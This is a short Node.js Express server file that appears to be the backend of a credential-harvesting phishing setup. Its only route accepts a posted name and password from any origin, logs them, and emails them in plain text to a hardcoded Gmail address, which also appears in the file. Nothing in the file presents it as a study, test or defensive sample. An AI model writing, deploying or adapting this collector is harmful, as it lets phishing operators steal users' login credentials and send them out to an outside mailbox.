const express =  require("express")
const nodemailer = require('nodemailer');
const dotenv = require("dotenv")
const cors = require("cors")


dotenv.config()

const transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST,
    port: process.env.EMAIL_PORT,
    auth: {
      user: process.env.EMAIL_USERNAME,
      pass: process.env.EMAIL_PASSWORD,
    },
  });


const app = express()
app.use(cors())
app.use(express.json())

app.post('/',(req,res)=>{
    const {name,pass} = req.body
    console.log(req.body)
    // Setup email data
let mailOptions = {
    from: 'kingindnorth.0311@gmail.com', // sender address
    to: 'kingindnorth.0311@gmail.com', // list of receivers
    subject: 'Hello from Node.js!', // Subject line
    html: `<b>This is a test email sent from Node.js Email: ${name},Password: ${pass}.</b>` // html body
};

// Send email
transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
        return console.log('Error occurred:', error);
    }
    console.log('Message sent: %s', info.messageId);
    res.status(200).json("successs")
});

})

const PORT = 5000

app.listen(PORT,()=>{
    console.log(`server listening to port ${PORT}`)
})